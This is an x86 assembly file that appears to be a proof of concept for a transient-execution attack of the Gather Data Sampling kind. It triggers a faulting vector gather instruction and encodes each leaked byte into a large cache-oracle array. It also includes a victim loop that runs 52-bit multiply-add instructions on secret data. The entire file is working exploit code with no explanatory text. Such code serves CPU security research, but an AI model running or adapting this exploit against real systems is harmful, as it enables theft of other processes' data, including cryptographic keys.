#include "config.h"

.data

address_fma:
    .space 64, 0x25 // Victim data


.align 0x1000
    .global oracles
oracles:
    .space 64*4096*256, 0

    .global address_normal
address_normal:
    .space 4096*16, 0

address_helper:
    .space 4096*16, 0

.global source
source:
    .space 4096, 0

.global dest
dest:
    .space 4096, 0


.text



.macro encode_ymm
    .set i,0
    .rept BYTE_TRY/8
    vextracti128 $i/2, %ymm5, %xmm0
    pextrq $i%2, %xmm0, %rax
    
    mov %rax, %rbx
    mov %rax, %rcx
    mov %rax, %rdx
    mov %rax, %r8
    mov %rax, %r9
    mov %rax, %r10
    mov %rax, %r11
    
    lea oracles+(8*i+0)*256*4096, %r13
    shr $0, %rax
    and $0xff, %rax
    shlq $12, %rax
    mov (%r13,%rax,1), %rax

    lea oracles+(8*i+1)*256*4096, %r13
    shr $8, %rbx
    and $0xff, %rbx
    shlq $12, %rbx
    mov (%r13,%rbx,1), %rax

    lea oracles+(8*i+2)*256*4096, %r13
    shr $16, %rcx
    and $0xff, %rcx
    shlq $12, %rcx
    mov (%r13,%rcx,1), %rax

    lea oracles+(8*i+3)*256*4096, %r13
    shr $24, %rdx
    and $0xff, %rdx
    shlq $12, %rdx
    mov (%r13,%rdx,1), %rax

    lea oracles+(8*i+4)*256*4096, %r13
    shr $32, %r8
    and $0xff, %r8
    shlq $12, %r8
    mov (%r13,%r8,1), %rax

    lea oracles+(8*i+5)*256*4096, %r13
    shr $40, %r9
    and $0xff, %r9
    shlq $12, %r9
    mov (%r13,%r9,1), %rax

    lea oracles+(8*i+6)*256*4096, %r13
    shr $48, %r10
    and $0xff, %r10
    shlq $12, %r10
    mov (%r13,%r10,1), %rax

    lea oracles+(8*i+7)*256*4096, %r13
    shr $56, %r11
    and $0xff, %r11
    shlq $12, %r11
    mov (%r13,%r11,1), %rax
    
    .set i,i+1
    .endr 
.endm

    .align 0x1000
    .global s_load_encode
s_load_encode:

    
    lfence
    mfence 
    .rept 32
    inc %rax
    .endr  

    vmovups (%rdi), %zmm3
    vpxord %zmm1, %zmm1, %zmm1
    vmovups (%rsi), %zmm1
    mov $0b1111111111111111, %rdi
    kmovq %rdi, %k1
    kmovq %rdi, %k2

// Introduce page fault in the load
    mov $0, %r13

// Prepare transient window
    lea address_helper, %rdi
    .set i,0
    .rept 0
    clflush 64*i(%rdi)
    mov 64*i(%rdi), %rax
    .set i,i+1
    .endr 
    
    .set i,0
    .rept 8
    xchg %rax, 64*i(%rdi)
    .set i,i+1
    .endr 
    
    .set i,0
    .rept 0
    lock incq 64*i(%rdi)
    .set i,i+1
    .endr 
    

    vpgatherdq 0(%r13, %ymm1, 1), %zmm5{%k1}  
    encode_ymm
    ret


   .global victim_asm
victim_asm: 
    
    lea address_fma, %rcx
    xor %r9, %r9
loop:
//////// AMS52 MULLPart(i) implementation
   .set i, 0   // Play around with this value to change offset
   vpxord %zmm0, %zmm0, %zmm0 // X_{i}
   vpxord %zmm1, %zmm1, %zmm1 // A_{curr}
   VPMADD52LUQ i(%rcx), %zmm0, %zmm1 // X_{i} = VPMADD52LUQ (X_{i}, A_{curr}, A_{i})
   .rept 10
    vpxord %zmm3, %zmm3, %zmm3 // T (set to zero initially)
    VPMADD52LUQ i(%rcx), %zmm1, %zmm3 // T = VPMADD52LUQ(ZERO, A_{curr}, A-{i})
    vpslld $1, %zmm3, %zmm3           // T = T << 1
    vpaddd %zmm1, %zmm1, %zmm3        // X_{i} = X_{i} + T
   .set i, i+1
   .endr
   jmp loop
